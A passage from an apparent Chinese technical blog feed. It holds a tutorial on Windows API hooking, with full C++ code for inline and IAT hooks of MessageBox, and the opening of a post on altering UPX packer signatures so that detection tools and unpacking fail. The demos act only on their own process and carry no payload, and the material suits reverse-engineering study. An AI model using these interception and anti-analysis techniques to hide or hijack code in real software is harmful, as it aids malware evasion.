class="title">MyMessageBoxW</span><span class="params">(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FUCK YOU VIRTUALPROTECT!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="保存原函数的前5字节"><a href="#保存原函数的前5字节" class="headerlink" title="保存原函数的前5字节"></a>保存原函数的前5字节</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将原API的入口前5个字节代码保存到OldCode[]</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">lea edi, OldCode<span class="comment">//获取OldCode数组的地址,放到edi</span></span><br><span class="line">mov esi, pfOldMsgBoxW        <span class="comment">//获取原API入口地址，放到esi</span></span><br><span class="line">cld<span class="comment">//方向标志位，为以下两条指令做准备</span></span><br><span class="line">movsd<span class="comment">//复制原API入口前4个字节到OldCode数组</span></span><br><span class="line">movsb<span class="comment">//复制原API入口第5个字节到OldCode数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="保存新函数的前4字节"><a href="#保存新函数的前4字节" class="headerlink" title="保存新函数的前4字节"></a>保存新函数的前4字节</h3><p>注意将NewCode[0]设置为0xe9</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取MyMessageBoxW的相对地址,为Jmp做准备</span></span><br><span class="line"><span class="comment">//int nAddr= UserFunAddr – SysFunAddr - （我们定制的这条指令的大小）;</span></span><br><span class="line"><span class="comment">//Jmp nAddr;</span></span><br><span class="line"><span class="comment">//（我们定制的这条指令的大小）, 这里是5，5个字节嘛</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">lea eax, MyMessageBoxW<span class="comment">//获取我们的MyMessageBoxW函数地址</span></span><br><span class="line">mov ebx, pfOldMsgBoxW<span class="comment">//原系统API函数地址</span></span><br><span class="line">sub eax, ebx<span class="comment">//int nAddr = UserFunAddr - SysFunAddr</span></span><br><span class="line">sub eax, <span class="number">5</span><span class="comment">//nAddr = nAddr - 5</span></span><br><span class="line">mov dword ptr[NewCode + <span class="number">1</span>], eax         <span class="comment">//将算出的地址nAddr保存到NewCode后面4个字节</span></span><br><span class="line"><span class="comment">//注：一个函数地址占4个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建HookOn与HookOff函数"><a href="#创建HookOn与HookOff函数" class="headerlink" title="创建HookOn与HookOff函数"></a>创建HookOn与HookOff函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启钩子的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">DWORD dwPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改API函数入口前5个字节为jmp xxxxxx</span></span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, PAGE_READWRITE, &amp;amp;dwOldProtect);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pfOldMsgBoxW, NewCode, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, dwOldProtect, &amp;amp;dwTemp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关闭钩子的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">DWORD dwPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复API函数入口前5个字节</span></span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, PAGE_READWRITE, &amp;amp;dwOldProtect);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pfOldMsgBoxW, OldCode, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, dwOldProtect, &amp;amp;dwTemp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">FARPROC pfOldMsgBoxW;</span><br><span class="line">BYTE NewCode[<span class="number">5</span>] = &#123;<span class="number">0xe9</span>&#125;, OldCode[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">DWORD dwPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, PAGE_READWRITE, &amp;amp;dwOldProtect);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pfOldMsgBoxW, NewCode, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, dwOldProtect, &amp;amp;dwTemp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">DWORD dwPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, PAGE_READWRITE, &amp;amp;dwOldProtect);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pfOldMsgBoxW, OldCode, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(hProcess, pfOldMsgBoxW, <span class="number">5</span>, dwOldProtect, &amp;amp;dwTemp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FUCK YOU VIRTUALPROTECT!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hModule = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;User32.dll&quot;</span>);</span><br><span class="line">pfOldMsgBoxW = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">lea edi, OldCode</span><br><span class="line">mov esi, pfOldMsgBoxW</span><br><span class="line">cld</span><br><span class="line">movsd</span><br><span class="line">movsb</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">lea eax, MyMessageBoxW</span><br><span class="line">mov ebx, pfOldMsgBoxW</span><br><span class="line">sub eax, ebx</span><br><span class="line">sub eax, <span class="number">5</span></span><br><span class="line">mov dword ptr[NewCode + <span class="number">1</span>], eax</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;test&quot;</span>, <span class="string">L&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">HookOn</span>();</span><br><span class="line"><span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;test&quot;</span>, <span class="string">L&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">HookOff</span>();</span><br><span class="line"><span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;test&quot;</span>, <span class="string">L&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改IAT表"><a href="#修改IAT表" class="headerlink" title="修改IAT表"></a>修改IAT表</h2><h3 id="获取原函数地址-1"><a href="#获取原函数地址-1" class="headerlink" title="获取原函数地址"></a>获取原函数地址</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> OldAddr;</span><br><span class="line">OldAddr = (<span class="type">int</span>)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="创建新函数-1"><a href="#创建新函数-1" class="headerlink" title="创建新函数"></a>创建新函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">NewMessageBox</span> <span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FUCK YOU VIRTUALPROTECT!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历IAT表"><a href="#遍历IAT表" class="headerlink" title="遍历IAT表"></a>遍历IAT表</h3><p>遍历IAT表寻找原函数的地址，将其改写为新函数的地址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">SetIATHook</span><span class="params">(<span class="type">int</span> OldAddr, <span class="type">int</span> NewAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD ImageBase = <span class="number">0</span>;</span><br><span class="line">    DWORD dwTemp;</span><br><span class="line">    PDWORD pFunAddr = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptionalHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ImageBase = (DWORD)<span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHeader = (PIMAGE_NT_HEADERS)(ImageBase + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNtHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + <span class="built_in">sizeof</span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    pDataDirectory = pOptionalHeader-&gt;DataDirectory;</span><br><span class="line">    pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + (pDataDirectory + <span class="number">1</span>)-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)ImageBase, <span class="number">0x20000</span>, <span class="number">0x40</span>, &amp;amp;dwTemp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pImportDirectory-&gt;FirstThunk != <span class="number">0</span> &amp;amp;&amp;amp; pImportDirectory-&gt;OriginalFirstThunk != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pFunAddr = (PDWORD)(ImageBase + pImportDirectory-&gt;FirstThunk);</span><br><span class="line">        <span class="keyword">while</span> (*pFunAddr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (OldAddr == *pFunAddr)</span><br><span class="line">            &#123;</span><br><span class="line">                *pFunAddr = NewAddr;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pFunAddr++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDirectory++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SetIATHook</span><span class="params">(<span class="type">int</span> OldAddr, <span class="type">int</span> NewAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD ImageBase = <span class="number">0</span>;</span><br><span class="line">    DWORD dwTemp;</span><br><span class="line">    PDWORD pFunAddr = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptionalHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ImageBase = (DWORD)<span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHeader = (PIMAGE_NT_HEADERS)(ImageBase + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNtHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + <span class="built_in">sizeof</span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    pDataDirectory = pOptionalHeader-&gt;DataDirectory;</span><br><span class="line">    pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + (pDataDirectory + <span class="number">1</span>)-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)ImageBase, <span class="number">0x20000</span>, <span class="number">0x40</span>, &amp;amp;dwTemp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pImportDirectory-&gt;FirstThunk != <span class="number">0</span> &amp;amp;&amp;amp; pImportDirectory-&gt;OriginalFirstThunk != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pFunAddr = (PDWORD)(ImageBase + pImportDirectory-&gt;FirstThunk);</span><br><span class="line">        <span class="keyword">while</span> (*pFunAddr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (OldAddr == *pFunAddr)</span><br><span class="line">            &#123;</span><br><span class="line">                *pFunAddr = NewAddr;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pFunAddr++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDirectory++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">NewMessageBox</span> <span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FUCK YOU VIRTUALPROTECT!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> OldAddr;</span><br><span class="line">    OldAddr = (<span class="type">int</span>)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;Old&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">SetIATHook</span>(OldAddr, (<span class="type">int</span>)NewMessageBox);</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;Old&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WindowsHook&quot;&gt;&lt;a href=&quot;#WindowsHook&quot; class=&quot;headerlink&quot; title=&quot;WindowsHook&quot;&gt;&lt;/a&gt;WindowsHook&lt;/h1&gt;&lt;p&gt;以MessageBox为例演示两种方法&lt;/p&gt;
&lt;h2 id=&quot;修改</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>UPX壳的修改</title>
    <link href="https://clovershrub.github.io/2023/03/08/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/"/>
    <id>https://clovershrub.github.io/2023/03/08/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/</id>
    <published>2023-03-07T16:00:00.000Z</published>
    <updated>2023-09-19T01:35:44.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UPX壳的修改"><a href="#UPX壳的修改" class="headerlink" title="UPX壳的修改"></a>UPX壳的修改</h1><p>咳咳，别被吓着，改UPX的源代码是万万不可能的，我要是能改那个我现在就不坐在这了。</p><h2 id="UPX壳的运行原理"><a href="#UPX壳的运行原理" class="headerlink" title="UPX壳的运行原理"></a>UPX壳的运行原理</h2><p>众所周知，UPX是一个开源的功能强大的压缩壳。在读完别人读UPX源码之后写的博客之后，总结如下：<br>首先，UPX会将我们的程序分成几个部分，假设7个部分好了：</p><table><thead><tr><th align="center">11</th><th align="center">22</th><th align="center">33</th><th align="center">44</th><th align="center">55</th><th align="center">66</th><th align="center">77</th></tr></thead></table><p>然后UPX会根据这个程序的平台、位数、使用的函数、大小之类的综合考虑一番，决定用LZMA、UCL、NRV中的哪个压缩算法。压缩后再将自己对应的解压算法添加在整个程序的前面，变成这个样子：</p><table><thead><tr><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th></tr></thead></table><p>其中0的部分就是解压算法和一些修正算法。</p><h2 id="修改UPX的信息"><a href="#修改UPX的信息" class="headerlink" title="修改UPX的信息"></a>修改UPX的信息</h2><p>P.S.以下修改过程中前后多改点少改点都是可以成功的。</p><h3 id="修改标识符"><a href="#修改标识符" class="headerlink" title="修改标识符"></a>修改标识符</h3><p>首先找一个加壳的普通<a href="https://files.cnblogs.com/files/blogs/775888/test.zip?t=1678289957">程序</a>(可能会爆毒)<br>拖到ExeinfoPE里可以看见：<br><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E6%A0%87%E8%AF%86%E7%AC%A61.png"><br>也就是说它即识别出来了UPX也看出来了是3.96的版本。将exe拖到010editor可以看见：<br><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E6%A0%87%E8%AF%86%E7%AC%A62.png"></p><p>这里我们发现了4个UPX标识，其中前两个代表了UPX的标识符一类的东西，将其改成你喜欢的东西：</p><p><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E6%A0%87%E8%AF%86%E7%AC%A63.png"></p><p>再次拖进ExeinfoPE，可以看见：<br><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E6%A0%87%E8%AF%86%E7%AC%A64.png"></p><p>发现它仍然认识UPX，只不过因为我们修改了它的标识符，显示出来的也是我们修改之后的样子。这里它虽然提醒Don’t try upx -d，实际上还是可以这么干的。</p><h3 id="修改版本信息"><a href="#修改版本信息" class="headerlink" title="修改版本信息"></a>修改版本信息</h3><p>上文提到的4个UPX标识中的剩下两个记录了UPX的版本信息，如果将他们修改，upx -d 将会因为不知道版本而失效：<br><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF1.png"><br><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF2.png"><br>这时如果是64位程序会提示Don’t try而32位程序会提示try。然而实际上都不会成功的。</p><h3 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h3><p>将程序拖到x64dbg可以找到入口点：</p><p><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E5%85%A5%E5%8F%A3%E7%82%B91.png"></p><p>此时可能会出现一堆push或者一个pushad，这几个都是可以改的，看心情改就好：</p><p><img src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E5%85%A5%E5%8F%A3%E7%82%B92.png"></p><p>再拖进ExeinfoPE看一看：<br><img 